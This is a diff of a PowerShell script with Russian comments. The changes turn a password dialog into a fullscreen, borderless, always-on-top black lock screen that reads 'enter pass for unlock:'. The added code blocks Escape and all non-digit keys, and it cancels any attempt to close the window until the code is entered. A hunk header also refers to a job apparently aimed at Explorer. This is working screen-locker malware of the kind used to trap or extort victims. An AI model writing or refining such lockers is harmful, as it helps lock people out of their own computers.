@@ -18,35 +18,44 @@ $job = Start-Job -ScriptBlock $BlockExplorerJob
 function Show-PasswordWindow {
     $form = New-Object System.Windows.Forms.Form
     $form.Text = "by egusikk:)"
-    $form.Size = New-Object System.Drawing.Size(350, 180)
-    $form.StartPosition = "CenterScreen"
-    $form.FormBorderStyle = "FixedDialog"
-    $form.MaximizeBox = $false
-    $form.MinimizeBox = $false
+    
+    # НАСТРОЙКИ СВЕРХУВЕРЕННОГО ОКНА НА ВЕСЬ ЭКРАН
+    $form.WindowState = "Maximized"
+    $form.FormBorderStyle = "None" # Убирает рамку и крестик
     $form.TopMost = $true 
-
-    # Отключаем реакцию формы на любые клики мыши за пределами элементов управления
+    $form.BackColor = [System.Drawing.Color]::Black # Черный фон для эффекта блокировки
     $form.Capture = $true
+
+    # Контейнер для элементов по центру экрана
+    $panel = New-Object System.Windows.Forms.Panel
+    $panel.Size = New-Object System.Drawing.Size(350, 180)
+    $panel.BackColor = [System.Drawing.Color]::DarkGray # Выделяющийся блок формы
+    $form.Controls.Add($panel)
+
+    # Центрирование панели при изменении размеров экрана
+    $form.Add_Resize({
+        $panel.Left = ($form.ClientSize.Width - $panel.Width) / 2
+        $panel.Top = ($form.ClientSize.Height - $panel.Height) / 2
+    })
 
     $label = New-Object System.Windows.Forms.Label
     $label.Location = New-Object System.Drawing.Point(20, 20)
     $label.Size = New-Object System.Drawing.Size(310, 20)
     $label.Text = "enter pass for unlock:"
-    $form.Controls.Add($label)
+    $panel.Controls.Add($label)
 
     $textBox = New-Object System.Windows.Forms.TextBox
     $textBox.Location = New-Object System.Drawing.Point(20, 50)
     $textBox.Size = New-Object System.Drawing.Size(290, 20)
     $textBox.PasswordChar = "*" 
-    $form.Controls.Add($textBox)
+    $panel.Controls.Add($textBox)
 
     $button = New-Object System.Windows.Forms.Button
     $button.Location = New-Object System.Drawing.Point(120, 90)
     $button.Size = New-Object System.Drawing.Size(100, 30)
     $button.Text = "Unlock"
-    $form.Controls.Add($button)
+    $panel.Controls.Add($button)
 
-    # Делаем кнопку Unlock кнопкой по умолчанию для клавиши Enter на форме
     $form.AcceptButton = $button
 
     # Логика проверки пароля
@@ -62,23 +71,30 @@ function Show-PasswordWindow {
         }
     }
 
-    # Клик по кнопке вызывает проверку
     $button.Add_Click($UnlockAction)
 
-    # БЛОКИРОВКА КЛАВИАТУРЫ: Разрешаем вводить только цифры и обрабатывать Enter
+    # БЛОКИРОВКА КЛАВИАТУРЫ: Разрешаем только цифры, Enter и Backspace. ESCAPE блокируется тут.
     $textBox.Add_KeyPress({
         param($_, $e)
-        # Получаем ASCII код нажатой клавиши
         $char = $e.KeyChar
         
-        # Разрешаем: Цифры (от '0' до '9') и Enter (код 13)
-        # Если это не они — отменяем ввод (Handled = $true)
-        if (-not (($char -ge '0' -and $char -le '9') -or $char -eq [char]13)) {
+        # Разрешаем: Цифры (0-9), Enter (13), Backspace (8)
+        if (-not (($char -ge '0' -and $char -le '9') -or $char -eq [char]13 -or $char -eq [char]8)) {
             $e.Handled = $true
         }
     })
 
-    # Дополнительный перехват клавиши Enter непосредственно внутри текстового поля
+    # Дополнительная блокировка системных клавиш (включая Escape) на уровне самой формы
+    $form.KeyPreview = $true
+    $form.Add_KeyDown({
+        param($_, $e)
+        # Блокировка клавиши Escape
+        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
+            $e.Handled = $true
+            $e.SuppressKeyPress = $true
+        }
+    })
+
     $textBox.Add_KeyDown({
         param($_, $e)
         if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
@@ -86,9 +102,14 @@ function Show-PasswordWindow {
             $e.Handled = $true
             $e.SuppressKeyPress = $true
         }
+        # Блокировка Escape внутри текстового поля
+        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
+            $e.Handled = $true
+            $e.SuppressKeyPress = $true
+        }
     })
 
-    # Запрещаем закрывать форму через Alt+F4 или крестик
+    # Запрет закрытия формы
     $form.Add_FormClosing({
         param($_, $e)
         if ($global:Unlocked -eq $false) {
@@ -96,7 +117,6 @@ function Show-PasswordWindow {
         }
     })
 
-    # Автофокус на поле ввода при открытии, чтобы пользователю не нужно было кликать мышкой
     $form.Add_Shown({ $textBox.Focus() })
 
     $form.ShowDialog() | Out-Null
